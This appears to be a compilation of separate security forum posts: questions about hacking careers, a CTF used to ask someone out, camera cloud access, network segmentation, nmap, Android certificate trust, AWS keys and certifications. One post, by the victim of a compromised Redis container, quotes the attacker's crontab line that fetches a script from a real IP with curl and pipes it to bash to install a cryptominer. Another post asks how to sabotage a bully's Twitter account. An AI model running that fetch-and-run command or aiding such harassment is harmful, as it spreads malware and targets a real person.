And although I've always wanted to be an ethical hacker, I want to ask you guys a few questions that'll help me decide or atleast give me an idea of how life is as an ethical hacker.\n\n1. How is the day to day routine of a ethical hacker? How would you describe it?\n2. How and when did you guys realize you wanted to get into this field and this is your passion?\n3. What is most enjoyable in your job?\n4. What are the negatives, but also what are the positives that opened up after you gained all your skills, etc.\n5. How many hours do you work during the week and what do you think about it?\n6. What skills/certificates/things made your job a little easier or you cant think of not having with you.\n7. How does your work-life ratio stand? Are you happy with how it is?\n8. Are there times you wish you chose another profession?\n9. What advice would you give to people wanting to get into this field?\n10. what language did you start hacking with and what language would you advice others to start with and why? \n11. Are you happy with the salary?\n\nThanks in advance, I'm just a little lost and want to make sure this is the career ill want to delve into. I love breaking into things and just finding vulnerabilities but its always good to do your research, ain't it?\n\n&amp;#x200B;\n\n&amp;#x200B;\n\n&amp;#x200B;",

To the point, my girlfriend has been bullied for months now at highschool and it's getting seriously out of hand. She gets critisized over twitter, is normally very sociable but is now extremely careful about what she says, wears,.. in school. The girl that's doing this to her even made my gf lose various friends. It pisses me off to see her get away with it. I was bullied myself when I was younger and my gf is really devastated about what she has to go through, she is such a sweet person to everyone so she really does'nt deserve this at all. What I'm trying to ask is: is there any way for me (with véry limited knowledge of such things) or a friendly person here would be able to affect her over the web somehow? Like doing something to her twitter (because she not only physically intimidates my gf but also does it by posting tweets that 'could be about her'), perhaps with bots or anything? I'm not asking anyone to do anything illegal or anything for me, I am just hopelessly lost for solutions to this problem. I talk to her a lot and get her through the worst days but it's really breaking her, a friend of hers is talking to the teachers since she is too scared of the bully's reaction to do so herself. I hope someone knows something because I am losing sight. \n\nTL;DR: my gf is getting heavily bullied at school, any suggestions for anything I/someone could do via internet?",

I'm actually being very generous with the term here, since it was a default `redis` image with no credentials so it was basically open to all.\n\nDespite the fact that the machine does not contain any valuable data, I'm curious about a couple of things:\n\n- The attacker added some random keys to redis which contained rows for a crontab that went like this\n \n    127.0.0.1:6379&gt; GET pqjksvfvcf    \n    \"\\n\\n*/* * * * * /usr/bin/curl -s http://192.99.142.226:8220/mr.sh | bash -sh\\n\\n\"\n\nSo I guess his intention was to add that cron to download the ~~webshell~~ ~~reverse shell~~ cryptominer malware on his server and run it immediately. How could he add that row to the crontab proper from redis though?\n\n- When attacking the container, even getting a reverse shell running would have put him in control of the container itself, not the host machine. Is this assertion correct?\n\nI don't know if the attacker's shell is some ready-to-go tool or if they crafted it themselves, but my guess is that they'll see this post and take down the server at that IP, so here's a pastebin with the contents of the file: https://pastebin.com/R0SV855T\n\nThanks!\n\n(and yes, I'll try to be more careful next time...)\n\nEDIT: After a very short google search I found out this is a cryptominer malware, and the same IP has been referenced on other forums and it's been online for a while.\n\nEDIT2: My first question is still valid, how does one inject the redis entry into the crontab? I'm also curious about the second question, even though this wasn't a reverse shell it could very well have been one.",

Thank you so much for everyone's help, and a special shoutout to @IdealImperialism for setting up an AES encryption challenge for me :) I didn't expect this post to blow up as much as it did, and unfortunately my guy found it while browsing reddit and knew I was doing a CTF to ask him out, but at least he didn't know what to expect with what I was planning!!\n\n1) I started by sending him a [poorly edited meme](https://scontent.fftw1-1.fna.fbcdn.net/v/t1.15752-0/p480x480/42614681_257080488281472_7765867227030487040_n.png?_nc_cat=110&amp;oh=8ef07bbcf1f9dd31f5898b5cc73d6304&amp;oe=5C2365CB) and an [encrypted website link](https://boring-heisenberg-dec8b1.netlify.com/) with a password form. The meme had a visible weird string that I encrypted using a very simple binary search tree cipher (I reused a program I had to write for a class).\n\n\n1.5) I encorporated stego in the image file, per @derp0x00's suggestion! In the stego message, I wrote a clue on how he should find a note in a physical object somewhere in his apartment.\n\n2) Hide and seek. I hid a little note with a link to the assignment prompt for the BST cipher. The stego gave clues as to where this note was hidden. Using this program (which I wanted him to code but someone uploaded their program on github... darn), he was able to find out the password. If anyone wants the link to the BST cipher assignment, PM me; I don't want to link it publicly since it's a bit personally identifying. \n\n3) The password worked on the website I gave to him previously! Once entered into the website, the hint showed where to netcat for a homebrew encryption set up by @IdealImperialism. Once you netcat in, you get a bunch of jibberish AES that when decrypted, revealed my final flag and asked him out!  My guy apparently focuses on systems and is pretty weak at crypto, so he got stuck here and said \"i guess i wasn't meant to be, i'll go live in the mountains now.\" At that point I just gave him the decrypted message LOL.\n\n---\n\nThrowaway for obvious reasons!\n\nI want to ask someone out who is very into computer security; I think doing it in a security-related way would be nice and he'd enjoy it a lot, even if it's not very advanced.\n\nI was thinking of coding a CTF with a few clue flags and a final flag asking him out, but I feel like that might be too technically challenging for me. For reference, I have an intermediate knowledge of Python and Java, some front end experience, and little to no knowledge about security.\n\nIf anyone has any suggestions on what I could do within my technical proficiency, I'd be super grateful.",

        "text": "TLDR: Anyone have any advise on extracting meaningful data from a binary file with a .pak extension (probably irrelevant). I've tried hexdump and xxd but just get the raw hex with zero human readable leads on the file type. This pak file is a configuration output from an IP camera in which I'm looking for some kind of fingerprint. Why is below:\n\n----------\n\nI have 2 Reolink RLC-R11 cameras which I've never used off my local network. They have been in place for a few months not and I've only viewed them with the Reolink desktop application. At one point I loaded the Reolink iPad app while on the local network, it found the devices, I entered the password, and yay.. It works and I hadn't used it on iPad since.\n\nThe issue is that I from work last week accidentally opened the Reolink iPad client and to my dismay found I could see the stream of my front and back yard. \n\nThe issue I have it that I've never configured any DynDNS, punched any holes through the firewall, or facilitated external connectivity to these cameras in anyway. All this time I was under the impression my camera feeds were ONLY available from the local network. It just fucking worked and I don't like it. \n\nSo my first assumption is the cameras are continuously beaconing out to Reolink waiting for a previously authorized client (my ipad) to show up. Once the iPad and cameras are given their instructions the stream is started, sent through reolink, and to the off site iPad. \n\nSome packet captures can solve this mystery and I'll do that eventually. \n\nBut how does Reolink know that my iPad has previously authenticated to this camera from the local network before? \n\nWild speculation... I'm thinking there's some kind of fingerprint generated and stored on the camera, iPad, and also sent to Reolink when the initial local network authentication is performed. Like a unique ID joining EVILGENTOOS-CAMERA+EVILGENTOOS-IPAD. If all these things line up then the stream is permitted?\n\nSo I assume this fingerprint, if it exists, is at least stored in the cameras config file which exports in a binary form as a .pak file. I want to see what's in this file. \n\nThanks asknetsec folks. Appreciate any pointing in the right direction. I've not dabbled in the reverse engineering realm much at all. That reverse engineering sub is a little too high level for my stupid questions.",

        "text": "Hi all,\n\nHopefully I'm posting this in the right subreddit, it's my first post after a lot of lurking. I'm after a security-perspective on integrating Philips Hue products into my home network and most Hue users I talk to aren't security-minded at all.\n\nI'd like some smart light bulbs, and my limited understanding of Philips Hue bulbs is that there's a hub that sits on the network and it has remote access functionality. To give you a brief run-down on things: my network is segmented into four areas using strict firewall rules (I haven't implemented VLANs yet): wifi, lan, lab, wlan. My home network is small so I can afford to be specific in what hosts can communicate where - for example, I only allow specific hosts to communicate between \"wifi\" and \"lan\", because \"lan\" contains servers like my NAS and not every host on \"wifi\" needs access to it; only one host on \"wifi\" can communicate with the \"lab\"; I whitelist ports for known traffic and block everything else by default.\n\nMy idea is to give the Hue devices their own subnet and use firewall rules to block everything except my iPhone (on \"wifi\") from communicating with the Hue hub; any device on the Hue subnet will not be able to send \"wlan\" traffic.\n\nOther than not using VLANs, does this sound reasonable for limiting access to/from Hue devices on the network? Am I missing anything? I really appreciate any input you guys can give me. Netsec is a hobby that I enjoy but there's always so much more to learn.\n\nThanks.",

By this I mean that I need to show how many computers, routers, printers, servers... are connected to my network. Our teacher told us how our school network operates, and he wants us to create a mind-map using tools such as Gliffy or Grapholite based on the information he gaves us. However, I wanted to try and use nmap or any other network tool (that I might not know about)  to perform a network scan and map the network based on the information that nmap gives me. I want to do this, because I want to try do it myself and expand my knowledge a bit more. He told me I am allowed to do this, but would need to investigate by myself.\n\nI guess my questions are:\n\nwhat is the best way I can map my network and create a visual representation of it? \n\nWould nmap or any other tool be suited for this?\n\nHow (if ever) have you mapped your network?\n\nI am looking forward to your responses and I thank everyone in advance :)",

I don't care if it's my physical phone or an emulator. \n\nI thought it would be easy, but sometime around Nougat Google decided that apps don't trust  user installed certificates. The best article I could find is [here](https://blog.jeroenhd.nl/article/android-7-nougat-and-certificate-authorities). Unfortunately I can't get a device that is both rooted and adb accessible. \n\nI started with my physical phone (Nexus 6) but found out that I removed my root a while ago. I don't want to put it back on (it's my personal phone), but I can if I need to.\n\nThen I moved onto emulators. Unfortunately I couldn't find a way to root the emulated Android ([these](https://github.com/0xFireball/root_avd) instructions failed at step 3, for some reason I can't run adb.exe root on my Windows computer). \n\nThen I found [Nox](https://downloadnox.com/) which has an easy root button in settings. I was able to move the cert to the system CA store, but it didn't show in the system CAs. I think it's because \"To install the certificate on Android, we need to rename the file to the name Android expects. The file name must be a certain hash of the certificate file with a .0 extension. The hash used for this is the old OpenSSL (&lt;1.0.0) hash.\" per [here](https://blog.jeroenhd.nl/article/android-7-nougat-and-certificate-authorities), but I didn't have OpenSSL on my Windows box at the moment.\n\nI can mess with that Nox install more (it's the closest I got), but it's a super sketchy application. I'm hoping there's an easier and less sketchy way somebody knows of to get what I want. ",

Anyone know of any good training labs, courses or references that go into this topic in depth? Are there any DVWA/Mutullidae type labs that teach about serialization vulns? \n\nTo provide a bit of background: I know what serialization is, I know of the burp extensions, I've even exploited a few (easy) ones before, but am looking to really improve in the area of being able to craft an exploit for this. \n\n  \nThanks in advance!",

Pretty ridiculous if you ask me. Without going causing a ruckus or going into the number of reasons I don't want to do this, I'm planning on just providing the key to the instance, and creating a user account, then restricting it. Ideally it would just be a user that has read access (and possibly execute?) to everything. How do I go about this properly? \n\n\nI've added new user accounts on the instance and required a password. However, if the threat actor has the private key, he can just SSH into the ubuntu account. How privileged is the default ubuntu account? Should I just create a new account for myself and remove the ubuntu account? I've added a password to the root account so only I would have access to that and you can't ssh into root using a keyfile. I've also set the billing on my account to notify me if it goes above like $1 in the case that someone does get a hold of it. \n\n\nIf at worst, this has become an exercise on how to harden instances to prevent lateral movement. Also, how doesn't AWS have an solution to this scenario? Or do they and I just don't know it?",

Randomly a couple weeks ago was at a security seminar and my god did it fascinate me. Prior to them, cyber security wasn't even close to my radar, but then I read Principles of Information Security from cover to cover, something I've never done for a topic. \n\nI don't necessarily regret switching to accounting and management (a dude's gotta eat!) but is there a way to either combine the two degrees (security and accounting) into something useful? Because I wanted to use my degree in accounting to become a purchasing agent or procurement manager, and I was hoping maybe I could help some IT organizations purchase some software tools for security, among other things.\n\nSo, is it worth it to study for things like A+, Security+, etc, just to get my foot in the door? Or is there a much easier way to do what I want? I like the tech, that much is obvious, but the business side of security fascinates me too. ",

I have heard mix reviews about eLearns WPT so I am a little worried about doing that one. Lastly the OSCE, I know it is a completely different direction than web application testing, but I figured it would be next step after OSCP. My company just started doing internal pentesting/red teaming and made me the lead on that. We have a pretty young team I am trying to step up. We also do a lot of web application testing as well, so both would be beneficial. Any personal reviews on going for OSWE? Worth just doing WPT instead? Or just head down the OSCE path.

I would like the requestor to write their reasoning for the request and get approval but what are some acute questions the user should answer?  I was thinking of a couple:\n\n&amp;#x200B;\n\n* How do these e-mails currently impact business operations?\n* Do we have a BAA in place with the organization? (May be irrelevant)\n* How many tickets a week are you currently opening to have e-mails released from this sender?\n\n&amp;#x200B;\n\nAny guidance and input would be greatly appreciated.",
